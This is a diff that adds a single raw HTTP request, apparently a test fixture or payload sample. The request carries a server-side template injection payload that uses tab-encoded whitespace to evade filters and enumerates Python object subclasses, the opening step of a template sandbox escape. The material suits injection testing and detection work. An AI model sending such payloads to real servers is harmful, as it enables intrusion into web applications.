@@ -1,0 +1,4 @@
+GET /a?data={%%09for%09x%09in%09().__class__.__base__.__subclasses__()%09%}{%%09endfor%09%} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
